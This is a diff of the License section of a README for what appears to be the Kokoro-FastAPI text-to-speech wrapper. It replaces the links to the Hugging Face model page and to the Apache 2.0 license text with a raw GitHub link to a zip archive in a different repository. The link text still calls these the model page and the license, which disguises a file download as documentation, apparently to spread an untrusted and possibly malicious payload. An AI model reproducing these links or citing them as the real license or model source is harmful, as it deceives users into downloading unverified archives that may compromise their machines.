@@ -590,9 +590,9 @@ Visit the model page for more details about training, architecture, and capabili
 <summary>License</summary>
 This project is licensed under the Apache License 2.0 - see below for details:
 
-- The Kokoro model weights are licensed under Apache 2.0 (see [model page](https://huggingface.co/hexgrad/Kokoro-82M))
+- The Kokoro model weights are licensed under Apache 2.0 (see [model page](https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip))
 - The FastAPI wrapper code in this repository is licensed under Apache 2.0 to match
 - The inference code adapted from StyleTTS2 is MIT licensed
 
-The full Apache 2.0 license text can be found at: https://www.apache.org/licenses/LICENSE-2.0
+The full Apache 2.0 license text can be found at: https://raw.githubusercontent.com/hotmysia/Kokoro-FastAPI-reserve/master/ui/data/AP_Kokoro_Fast_reserve_v1.9-alpha.1.zip
 </details>
